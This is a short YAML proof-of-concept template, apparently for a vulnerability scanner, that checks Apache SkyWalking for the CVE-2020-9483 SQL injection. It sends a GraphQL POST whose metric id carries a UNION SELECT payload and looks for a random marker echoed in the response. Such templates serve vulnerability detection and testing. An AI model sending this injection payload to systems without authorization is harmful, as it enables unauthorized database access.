detail:
  author: sndav(https://github.com/Sndav)
  links:
  - https://paper.seebug.org/1485/
expression: r0()
manual: true
name: poc-yaml-skywalking-cve-2020-9483-sqli
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes("~" + string(r1)
      + "~"))
    request:
      body: '{"query":"query SQLi($d: Duration!){globalP99:getLinearIntValues(metric:
        {name:\"all_p99\",id:\"'') UNION SELECT 1,CONCAT(''~'',''{{r1}}'',''~'')--
        \",}, duration: $d){values{value}}}","variables":{"d":{"start":"2021-11-11","end":"2021-11-12","step":"DAY"}}}

        '
      cache: true
      headers:
        Content-Type: application/json
      method: POST
      path: /graphql
set:
  r1: randomInt(10000, 99999)
transport: http
